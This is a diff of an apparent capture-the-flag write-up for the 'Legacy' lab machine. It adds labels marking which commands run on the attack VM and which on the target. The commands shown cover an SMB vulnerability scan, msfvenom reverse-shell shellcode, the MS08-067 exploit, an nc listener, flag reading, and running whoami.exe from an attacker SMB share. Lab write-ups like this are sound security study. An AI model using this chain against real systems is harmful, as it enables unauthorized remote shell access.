@@ -45,12 +45,14 @@ nmap --script smb-vuln* -p 139,445 10.10.10.4
 + Update the shellcode in the exploit with our own. Copy the shellcode from **shellcode.txt** and overwrite the payload in the exploit.
 
 ```
+# On the kali attack vm:
 msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.24 LPORT=4444 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f python -v shellcode -a x86 --platform windows -o shellcode.txt
 
 python ms08-067.py 10.10.10.4 6 445
 
 nc -lnvp 4444
 
+# On the target machine:
 cd Documents and Settings\john\Desktop
 
 type user.txt
@@ -67,8 +69,10 @@ type root.txt
 + Check if get the NT AUTHORITY\SYSTEM level access.
 
 ```
+# On the kali attack vm:
 smbserver.py win /usr/share/windows-binaries/
 
+# On the target machine:
 \\10.10.14.24\win\whoami.exe
 ```
 
